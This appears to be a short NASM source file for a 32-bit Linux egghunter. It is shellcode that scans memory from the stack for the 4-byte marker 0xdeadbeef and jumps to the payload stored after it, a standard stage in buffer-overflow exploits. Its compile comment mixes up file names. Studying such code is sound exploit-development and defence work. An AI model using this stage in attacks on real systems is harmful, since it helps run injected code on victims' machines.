; Filename: small_egghunter.nasm
; Author:  Plaix
; Website:  http://slacklabs.be
;
; Purpose: 
; Searches up or down for our egg, which is only 4 bytes 

; Compile:
; --------
;
; nasm -f elf32 -o $small_egghunter.o $template.nasm
; ld -o $small_egghunter $template.o




global _start			

section .text
_start:

	mov eax,esp ; get an addres on the stack that's valid
	mov ebx,0xdeadbeee
	inc ebx
	
loop:	
	inc eax
	cmp dword [eax],ebx
	jnz loop
	; if the egg is found
	; play nice with the python script
	add eax,0x4
	push eax
	ret
